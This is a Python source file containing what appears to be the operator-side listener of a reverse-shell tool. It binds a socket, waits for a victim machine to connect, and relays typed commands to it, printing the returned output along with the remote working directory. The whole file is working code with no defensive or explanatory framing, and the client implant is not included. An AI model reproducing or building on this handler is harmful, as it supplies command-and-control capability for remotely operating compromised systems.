# Function for listening

import socket

def listen_for_connections(host, port):

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))

        s.listen(5)

        client_s, ip_address = s.accept()
        
        print(f"{ip_address[0]} connected\n")
        
        current_directory = client_s.recv(2048).decode('utf-8')

        while True:
            
            command = input(f"\033[31m{ip_address[0]}\033[39m: {current_directory}>")
            
            if command != "":
                
                client_s.send(command.encode('utf-8'))
                directory_recv = client_s.recv(2048).decode('utf-8')
                
                if directory_recv[:3] == "CWD":
                    
                    current_directory = directory_recv[4:]
                    
                output = "MESSAGE BEGIN "
                
                while output[-11:] != "MESSAGE END":
                    
                    output = output + client_s.recv(2048).decode('utf-8')
                    
                print(output[14:-12])

    except:
        
        print("\033[31m\n[!] session quit unexpectedly\033[39m\n")